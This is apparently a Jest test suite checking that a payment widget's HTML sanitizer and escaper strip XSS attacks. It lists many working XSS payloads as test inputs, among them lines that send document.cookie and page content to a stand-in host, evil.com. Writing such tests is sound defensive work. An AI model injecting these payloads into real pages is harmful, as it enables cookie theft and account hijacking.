/**
 * Comprehensive test suite for XSS sanitization
 *
 * Tests cover:
 * - HTML sanitization with tag/attribute whitelisting
 * - HTML escaping for template data
 * - OWASP and advanced XSS attack vectors (obfuscation, encoding, mXSS)
 * - Protocol-based attacks (javascript:, vbscript:, data:)
 * - CSS injection, SVG-based XSS, form/meta/template-based attacks
 * - Browser-specific attack vectors
 * - Performance and stress testing
 * - Edge cases and error handling
 * - Real-world widget scenarios
 */

import { sanitizeHTML, escapeHTML } from "../src/utils/sanitizer";

describe("Sanitizer Module - XSS Protection", () => {
  describe("sanitizeHTML() - Basic Whitelisting", () => {
    test("should allow safe HTML tags", () => {
      const safe = '<div class="container"><span>Hello</span></div>';
      const result = sanitizeHTML(safe);
      expect(result).toContain("<div");
      expect(result).toContain("<span>Hello</span>");
    });

    test("should remove script tags", () => {
      const malicious = '<div>Hello<script>alert("XSS")</script></div>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain("<script");
      expect(result).not.toContain("alert");
      expect(result).toContain("Hello");
    });

    test("should remove iframe tags", () => {
      const malicious = '<div><iframe src="evil.com"></iframe></div>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain("<iframe");
    });

    test("should remove object and embed tags", () => {
      const objectTag = '<object data="evil.swf"></object>';
      const embedTag = '<embed src="evil.swf">';
      expect(sanitizeHTML(objectTag)).not.toContain("<object");
      expect(sanitizeHTML(embedTag)).not.toContain("<embed");
    });

    test("should remove event handler attributes", () => {
      const malicious = '<div onclick="alert(1)">Click</div>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain("onclick");
    });

    test("should remove onerror handlers", () => {
      const malicious = '<img src="x" onerror="alert(1)">';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain("onerror");
    });

    test("should remove onload handlers", () => {
      const malicious = '<body onload="alert(1)">';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain("onload");
    });

    test("should remove javascript: protocol in href", () => {
      const malicious = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toMatch(/javascript:/i);
    });

    test("should remove data: protocol in img src", () => {
      const malicious = '<img src="data:text/html,<script>alert(1)</script>">';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain("data:text/html");
    });

    test("should allow aria-* attributes", () => {
      const accessible = '<button aria-label="Close" aria-hidden="false">X</button>';
      const result = sanitizeHTML(accessible);
      expect(result).toContain("aria-label");
      expect(result).toContain("aria-hidden");
    });

    test("should allow data-* attributes", () => {
      const withData = '<div data-id="123" data-testid="modal">Content</div>';
      const result = sanitizeHTML(withData);
      expect(result).toContain("data-id");
      expect(result).toContain("data-testid");
    });

    test("should handle empty or null input", () => {
      expect(sanitizeHTML("")).toBe("");
      expect(sanitizeHTML(null)).toBe("");
      expect(sanitizeHTML(undefined)).toBe("");
    });

    test("should handle non-string input", () => {
      expect(sanitizeHTML(123)).toBe("");
      expect(sanitizeHTML({})).toBe("");
      expect(sanitizeHTML([])).toBe("");
    });
  });

  describe("escapeHTML() - Template Data Escaping", () => {
    test("should escape < and >", () => {
      const input = "<script>alert(1)</script>";
      const result = escapeHTML(input);
      expect(result).toBe("&lt;script&gt;alert(1)&lt;&#x2F;script&gt;");
    });

    test("should escape quotes", () => {
      const input = "Hello \"World\" and 'Universe'";
      const result = escapeHTML(input);
      expect(result).toContain("&quot;");
      expect(result).toContain("&#x27;");
    });

    test("should escape ampersands", () => {
      const input = "Company & Co.";
      const result = escapeHTML(input);
      expect(result).toContain("&amp;");
    });

    test("should escape slashes", () => {
      const input = "</script>";
      const result = escapeHTML(input);
      expect(result).toContain("&#x2F;");
    });

    test("should handle non-string input safely", () => {
      expect(escapeHTML(null)).toBe("");
      expect(escapeHTML(undefined)).toBe("");
      expect(escapeHTML(123)).toBe("");
    });

    test("should escape consecutive special characters", () => {
      const input = "<<<>>>&&\"\"''";
      const result = escapeHTML(input);
      expect(result).toBe("&lt;&lt;&lt;&gt;&gt;&gt;&amp;&amp;&quot;&quot;&#x27;&#x27;");
    });

    test("should handle strings with all special characters", () => {
      const input = '<tag attr="value" & more=\'other\'>';
      const result = escapeHTML(input);
      expect(result).toContain("&lt;");
      expect(result).toContain("&gt;");
      expect(result).toContain("&quot;");
      expect(result).toContain("&#x27;");
      expect(result).toContain("&amp;");
      expect(result).not.toContain("<tag");
      expect(result).not.toContain(">");
      expect(result).not.toMatch(/" more/);
    });

    test("should escape mixed content correctly", () => {
      const input = "Normal text <script> & </script> more text";
      const result = escapeHTML(input);
      expect(result).toContain("Normal text");
      expect(result).toContain("&lt;script&gt;");
      expect(result).toContain("&amp;");
      expect(result).toContain("more text");
    });

    test("should handle already-escaped entities by double-escaping", () => {
      const input = "&lt;already escaped&gt;";
      const result = escapeHTML(input);
      expect(result).toContain("&amp;lt;");
      expect(result).toContain("&amp;gt;");
    });
  });

  describe("OWASP XSS Attack Vectors", () => {
    const xssVectors = [
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "<iframe src=javascript:alert(1)>",
      '<object data="data:text/html,<script>alert(1)</script>">',
      '<embed src="javascript:alert(1)">',
      '<a href="javascript:alert(1)">click</a>',
      '<form action="javascript:alert(1)">',
      "<input onfocus=alert(1) autofocus>",
      "<select onfocus=alert(1) autofocus>",
      "<textarea onfocus=alert(1) autofocus>",
      "<body onload=alert(1)>",
      "<marquee onstart=alert(1)>",
      "<details open ontoggle=alert(1)>",
      "<video><source onerror=alert(1)>",
      "<audio src=x onerror=alert(1)>",
      '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
      "<img src=x:alert(1) onerror=eval(src)>",
      "<svg><script>alert(1)</script></svg>",
      '<math><mi xlink:href="data:x,<script>alert(1)</script>">',
      '<div style="background:url(javascript:alert(1))">',
    ];

    xssVectors.forEach((vector) => {
      test(`should block XSS vector: ${vector.substring(0, 50)}...`, () => {
        const result = sanitizeHTML(vector);
        expect(result).not.toMatch(/\son\w+\s*=/i);
        expect(result).not.toMatch(/(href|src|action|data)\s*=\s*["']?\s*javascript:/i);
        expect(result).not.toMatch(/<script[\s>]/i);
        expect(result).not.toMatch(/style\s*=.*javascript:/i);
      });
    });
  });

  describe("Advanced XSS Attack Vectors", () => {
    test("should block encoded script tags", () => {
      const attacks = [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(1)//<</SCRIPT>",
        "<script>a=/XSS/;alert(a.source)</script>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/<script/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block obfuscated event handlers", () => {
      const attacks = [
        "<img src=x on error=alert(1)>",
        "<img src=x on\nerror=alert(1)>",
        "<img src=x on\terror=alert(1)>",
        "<img src=x one%72ror=alert(1)>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/onerror/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block Base64 encoded attacks", () => {
      const attacks = [
        '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/data:.*base64/i);
      });
    });

    test("should block mutation XSS (mXSS)", () => {
      const attacks = [
        "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
        "<listing><img src=x onerror=alert(1)></listing>",
        "<style><img src=x onerror=alert(1)></style>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/onerror/i);
        expect(result).not.toMatch(/alert/i);
      });
    });
  });

  describe("Protocol-Based Attacks", () => {
    test("should block javascript: protocol variants", () => {
      const attacks = [
        '<a href="javascript:alert(1)">click</a>',
        '<a href="java\nscript:alert(1)">click</a>',
        '<a href="java\tscript:alert(1)">click</a>',
        '<a href="java\x00script:alert(1)">click</a>',
        '<a href="jav&#x0A;ascript:alert(1)">click</a>',
        '<a href="jav&#x09;ascript:alert(1)">click</a>',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/javascript:/i);
      });
    });

    test("should block vbscript: protocol", () => {
      const attacks = [
        '<a href="vbscript:msgbox(1)">click</a>',
        '<img src="vbscript:msgbox(1)">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/vbscript:/i);
      });
    });

    test("should block data: protocol in dangerous contexts", () => {
      const attacks = [
        '<script src="data:text/javascript,alert(1)">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/data:/i);
      });
    });

    test("should allow safe data: URIs for images", () => {
      const safeDataUri = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">';
      const result = sanitizeHTML(safeDataUri);
      expect(result).toContain("<img");
      expect(result).toContain("data:image/png");
      expect(result).not.toMatch(/javascript:/i);
    });
  });

  describe("CSS Injection Attacks", () => {
    test("should remove inline styles with expressions and javascript URLs", () => {
      const attacks = [
        '<div style="width:expression(alert(1))">content</div>',
        '<div style="background:url(javascript:alert(1))">content</div>',
        '<div style="xss:expression(alert(1))">content</div>',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("style=");
        expect(result).not.toMatch(/expression/i);
      });
    });

    test("should remove style tags with malicious content", () => {
      const attacks = [
        "<style>body { background:url(javascript:alert(1)); }</style>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<style>*{xss:expression(alert(1))}</style>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<style");
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should remove link tags importing malicious stylesheets", () => {
      const attacks = [
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<link");
      });
    });
  });

  describe("SVG-Based XSS Attacks", () => {
    test("should block SVG with script tags", () => {
      const attacks = [
        "<svg><script>alert(1)</script></svg>",
        "<svg><script xlink:href='data:text/javascript,alert(1)'/>",
        "<svg><script href='data:text/javascript,alert(1)'/>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/<script/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block SVG with event handlers", () => {
      const attacks = [
        "<svg onload=alert(1)>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>",
        "<svg><animatetransform onbegin=alert(1)>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/onload|onbegin/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block SVG with xlink:href attacks", () => {
      const attacks = [
        '<svg><use xlink:href="data:image/svg+xml,<svg><script>alert(1)</script></svg>">',
        '<svg><image xlink:href="javascript:alert(1)">',
        '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/javascript:/i);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should allow safe SVG content (paths, circles, viewBox)", () => {
      const safe = `
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <path d="M10,10 L90,90" stroke="black" />
          <circle cx="50" cy="50" r="40" fill="blue" />
        </svg>
      `;
      const result = sanitizeHTML(safe);
      expect(result).toContain("<svg");
      expect(result).toContain("<path");
      expect(result).toContain("<circle");
      expect(result).toContain("blue");
    });
  });

  describe("Form-Based Attacks", () => {
    test("should block form submissions to malicious URLs", () => {
      const attacks = [
        '<form action="javascript:alert(1)">',
        '<form action="data:text/html,<script>alert(1)</script>">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/javascript:/i);
      });
    });

    test("should block formaction attributes", () => {
      const attacks = [
        '<button formaction="javascript:alert(1)">click</button>',
        '<input type="submit" formaction="javascript:alert(1)">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/formaction.*javascript/i);
      });
    });
  });

  describe("Meta Tag Attacks", () => {
    test("should block meta refresh redirects", () => {
      const attacks = [
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toContain("<meta");
      });
    });

    test("should block content-type meta tags", () => {
      const attack = '<meta http-equiv="Content-Type" content="text/html; charset=utf-7">';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain("<meta");
    });
  });

  describe("Template and Import Attacks", () => {
    test("should block template tags with scripts", () => {
      const attacks = [
        "<template><script>alert(1)</script></template>",
        "<template><img src=x onerror=alert(1)></template>",
      ];
      attacks.forEach((attack) => {
        const result = sanitizeHTML(attack);
        expect(result).not.toMatch(/alert/i);
      });
    });

    test("should block HTML imports", () => {
      const attack = '<link rel="import" href="javascript:alert(1)">';
      const result = sanitizeHTML(attack);
      expect(result).not.toContain("<link");
    });
  });

  describe("Browser-Specific Attack Vectors", () => {
    test("should block UTF-7 encoding attacks", () => {
      const attack = "+ADw-script+AD4-alert(1)+ADw-/script+AD4-";
      const result = sanitizeHTML(attack);
      expect(result).not.toContain("<script");
    });

    test("should block NULL byte injection", () => {
      const attack = "<script>alert(1)\x00</script>";
      const result = sanitizeHTML(attack);
      expect(result).not.toMatch(/<script/i);
    });
  });

  describe("Performance and Stress Testing", () => {
    test("should handle extremely long strings efficiently", () => {
      const longString = "<div>" + "A".repeat(100000) + "</div>";
      const start = Date.now();
      const result = sanitizeHTML(longString);
      const duration = Date.now() - start;
      expect(result).toContain("A");
      expect(duration).toBeLessThan(1000);
    });

    test("should handle deeply nested structures", () => {
      let nested = "content";
      for (let i = 0; i < 100; i++) {
        nested = `<div>${nested}</div>`;
      }
      const result = sanitizeHTML(nested);
      expect(result).toContain("content");
    });

    test("should handle many attributes", () => {
      let attrs = "";
      for (let i = 0; i < 100; i++) {
        attrs += ` data-attr${i}="value${i}"`;
      }
      const html = `<div${attrs}>content</div>`;
      const result = sanitizeHTML(html);
      expect(result).toContain("content");
    });

    test("should handle mixed safe and malicious content", () => {
      const mixed = `
        <div class="safe">Safe content</div>
        <script>alert(1)</script>
        <p>More safe content</p>
        <img src=x onerror=alert(1)>
        <span>Even more safe content</span>
      `;
      const result = sanitizeHTML(mixed);
      expect(result).toContain("Safe content");
      expect(result).toContain("More safe content");
      expect(result).toContain("Even more safe content");
      expect(result).not.toMatch(/<script/i);
      expect(result).not.toMatch(/onerror/i);
      expect(result).not.toMatch(/alert/i);
    });
  });

  describe("Edge Cases and Error Handling", () => {
    test("should handle deeply nested HTML", () => {
      const nested = "<div><div><div><div><span>Deep</span></div></div></div></div>";
      const result = sanitizeHTML(nested);
      expect(result).toContain("Deep");
    });

    test("should handle malformed HTML", () => {
      const malformed = "<div><span>Unclosed";
      const result = sanitizeHTML(malformed);
      expect(result).toContain("Unclosed");
    });

    test("should handle HTML with special characters", () => {
      const special = "<div>Price: $99.99 & free shipping!</div>";
      const result = sanitizeHTML(special);
      expect(result).toContain("$99.99");
    });

    test("should preserve whitespace in text content", () => {
      const whitespace = "<div>  Hello   World  </div>";
      const result = sanitizeHTML(whitespace);
      expect(result).toContain("Hello");
      expect(result).toContain("World");
    });

    test("should handle unicode characters", () => {
      const unicode = "<div>Café ☕ 日本語</div>";
      const result = sanitizeHTML(unicode);
      expect(result).toContain("Café");
      expect(result).toContain("☕");
      expect(result).toContain("日本語");
    });

    test("should handle HTML entities", () => {
      const entities = "<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>";
      const result = sanitizeHTML(entities);
      expect(result).toContain("&lt;");
      expect(result).toContain("&gt;");
    });

    test("should handle very long strings", () => {
      const long = "<div>" + "A".repeat(10000) + "</div>";
      const result = sanitizeHTML(long);
      expect(result).toContain("A".repeat(100));
    });
  });

  describe("Real-World Widget Scenarios", () => {
    test("should sanitize user-provided modal HTML and strip script tags", () => {
      const userHTML = `
        <div class="custom-modal">
          <h2>Payment Options</h2>
          <p>Choose your plan</p>
          <script>trackUser()</script>
        </div>
      `;
      const result = sanitizeHTML(userHTML);
      expect(result).toContain("Payment Options");
      expect(result).toContain("Choose your plan");
      expect(result).not.toContain("trackUser");
    });

    test("should block widget-specific data exfiltration attacks", () => {
      const maliciousModal = `
        <div class="custom-modal">
          <h2>Payment Options</h2>
          <script>
            fetch('https://evil.com/steal?data=' + document.cookie);
          </script>
        </div>
      `;
      const result = sanitizeHTML(maliciousModal);
      expect(result).toContain("Payment Options");
      expect(result).not.toContain("<script");
      expect(result).not.toMatch(/fetch|cookie/i);
    });

    test("should escape malicious price data in templates", () => {
      const maliciousPrice =
        '$99.99<img src=x onerror="this.src=\'https://evil.com/track?price=\'+document.body.innerHTML">';
      const escaped = escapeHTML(maliciousPrice);
      expect(escaped).not.toContain("<img");
      expect(escaped).toContain("&lt;img");
      expect(escaped).toContain("$99.99");
    });

    test("should preserve accessibility attributes", () => {
      const accessible = `
        <button
          aria-label="Close modal"
          aria-description="Closes the Sezzle information modal"
          role="button">
          ×
        </button>
      `;
      const result = sanitizeHTML(accessible);
      expect(result).toContain("aria-label");
      expect(result).toContain("aria-description");
      expect(result).toContain('role="button"');
    });
  });
});
